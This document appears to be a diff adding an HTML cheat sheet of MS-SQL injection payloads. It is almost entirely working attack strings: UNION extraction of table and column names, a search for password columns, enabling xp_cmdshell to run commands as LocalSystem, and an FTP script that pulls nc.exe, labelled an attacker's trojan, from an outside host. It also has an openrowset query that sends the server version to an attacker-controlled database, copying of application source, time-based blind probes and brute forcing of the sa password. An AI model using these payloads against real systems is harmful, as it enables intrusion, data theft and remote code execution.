@@ -1,0 +1,97 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Data extraction</title>
+</head><body><b><span style="font-size: 10pt">Output concatenation<br/>
+</span></b><span style="font-size: 10pt"><tt><br/>
+</tt></span><span style="font-size: 10pt"><tt>SELECT table_name+':'+column_name from information_ schema.columns</tt></span><span style="font-size: 12pt"><b><br/>
+</b></span><span style="font-size: 12pt"><b><br/>
+</b></span><b><span style="font-size: 10pt">MS-SQL version</span><span style="font-size: 14pt"><br/>
+</span><span style="font-size: 14pt"><span style="font-size: 10pt"><br/>
+</span></span></b><span style="font-size: 10pt">Using UNION<b><span style="font-size: 14pt"><br/>
+</span></b></span><tt>AAA' UNION SELECT @@version,NULL,NULL--<br/>
+<br/>
+</tt><b><span style="font-size: 14pt">Basic extraction</span><br/>
+</b><br/>
+<b>Display table names and column names</b><br/>
+<span style="font-size: 10pt"><tt><br/>
+AAA'%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns--<br/>
+<br/>
+</tt></span><b>Find table with column name containing PASS</b><br/>
+<tt><span style="font-size: 10pt"><br/>
+SELECT table_name,column_name FROM information_schema.columns where column_name LIKE '%PASS%'<br/>
+<br/>
+</span></tt><b>Time delay of 5 seconds if the current database user is sa</b><br/>
+<tt><br/>
+</tt><tt>if (select user) = 'sa' waitfor delay '0:0:5'</tt><b><span style="font-size: 14pt"><br/>
+</span></b><b><span style="font-size: 14pt"><br/>
+</span></b><b><span style="font-size: 16pt">xp_cmdshell</span></b><br/>
+<br/>
+<b>Enable xp_cmdshell: MS-SQL2000<br/>
+</b><tt><br/>
+sp_addextendedproc 'xp_cmdshell','xp_log70.dll'<br/>
+</tt><br/>
+If doesn't work the inject (SQLmap automatically injects it)<tt><br/>
+</tt><tt><br/>
+<i>CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int=0)AS<br/>
+DECLARE @result int, @OLEResult int, @RunResult int DECLARE @ShellID int<br/>
+EXECUTE @OLEResult = sp_OACreate ‘WScript.Shell’, @ShellID<br/>
+OUT<br/>
+IF @OLEResult &lt;&gt; 0 SELECT @result = @OLEResult<br/>
+IF @OLEResult &lt;&gt; 0 RAISERROR (‘CreateObject %0X’, 14, 1, @<br/>
+OLEResult)<br/>
+EXECUTE @OLEResult = sp_OAMethod @ShellID, ‘Run’, Null,<br/>
+@cmd, 0, @Wait<br/>
+IF @OLEResult &lt;&gt; 0 SELECT @result = @OLEResult<br/>
+IF @OLEResult &lt;&gt; 0 RAISERROR (‘Run %0X’, 14, 1, @OLEResult)<br/>
+</i><i>EXECUTE @OLEResult = sp_OADestroy @ShellID return @result</i><br/>
+<br/>
+</tt><b>Enable xp_cmdshell: MS-SQL2005</b><tt><br/>
+</tt><tt><br/>
+</tt><tt>master..sp_configure 'show advanced options',1</tt><br/>
+<tt>RECONFIGURE WITH OVERRIDE</tt><br/>
+<tt>master..sp_configure 'xp_cmdshell',1</tt><br/>
+<tt>RECONFIGURE WITH OVERRIDE</tt><br/>
+<br/>
+<b>Executes arbitrary shell command with LocalSystem user</b><br/>
+<tt><br/>
+</tt><tt>master..xp_cmdshell 'ipconfig &gt; foo.txt'</tt><br/>
+<tt>exec xp_cmdshell 'dir'<br/>
+</tt><tt>exec master.dbo.xp_cmdshell 'dir c:\inetpub &gt; c:\inetpub\wwwroot\test.txt'--</tt><br/>
+<br/>
+<span style="font-size: 10pt"><b>Outputs query to file(MS-SQL&lt;=2005)</b><tt><br/>
+</tt><tt><br/>
+</tt></span><span style="font-size: 10pt"><tt>exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--</tt></span><b><span style="font-size: 12pt"><br/>
+</span></b><b><span style="font-size: 12pt"><br/>
+</span><span style="font-size: 10pt">Downloads attacker's trojan<br/>
+</span></b><span style="font-size: 10pt"><tt><br/>
+exec master..xp_cmdshell ‘echo open ftp.tester.org &gt; ftp- script.txt’;--<br/>
+exec master..xp_cmdshell ‘echo USER &gt;&gt; ftpscript.txt’;-- exec master..xp_cmdshell ‘echo PASS &gt;&gt; ftpscript.txt’;-- exec master..xp_cmdshell ‘echo bin &gt;&gt; ftpscript.txt’;--<br/>
+exec master..xp_cmdshell ‘echo get nc.exe &gt;&gt; ftpscript.txt’;-- exec master..xp_cmdshell ‘echo quit &gt;&gt; ftpscript.txt’;--<br/>
+</tt></span><span style="font-size: 10pt"><tt>exec master..xp_cmdshell ‘ftp -s:ftpscript.txt’;--</tt></span><span style="font-size: 12pt"><b><br/>
+</b></span><span style="font-size: 12pt"><b><br/>
+</b></span><b><span style="font-size: 14pt">other extraction techniques</span><span style="font-size: 10pt"><br/>
+</span></b><br/>
+<b>Following query causes the target database to open a connection to the attacker’s database and insert the version string of the target database into the table called foo (<span style="font-size: 10pt">MS-SQL&lt;=2000</span>)</b><br/>
+<tt><br/>
+insert into openrowset('SQLOLEDB','DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein','select * from foo') values (@@version)<br/>
+<br/>
+</tt><b>Extracts current db name</b><tt><br/>
+</tt><tt><br/>
+/controlboard.asp?boardID=2&amp;itemnum=1%20AND%201=CONVERT(int,%20db_name())<br/>
+/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,’stat’,’name1’,’na me2’,2006-01-06,1,@@version%20--<br/>
+</tt><br/>
+<b><span style="font-size: 10pt">Get app sourcecode</span><span style="font-size: 12pt"><br/>
+</span></b><span style="font-size: 10pt"><tt><br/>
+a';master.dbo.xp_cmdshell 'copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--<br/>
+<br/>
+</tt></span><b><span style="font-size: 14pt">Time-based techniques</span><span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt"><br/>
+Asses 2005 version with blind time-based injection<br/>
+</span></b><span style="font-size: 10pt"><tt><br/>
+if substring((select @@version),25,1) = 5 waitfor delay ‘0:0:5’<br/>
+</tt></span><br/>
+<b>Bruteforce sysadmin password</b><br/>
+<br/>
+select * from OPENROWSET(‘SQLOLEDB’,’’;’sa’;’&lt;pwd&gt;’,’select 1;waitfor delay ‘’0:0:5’’ ‘)<br/>
+</body></html>
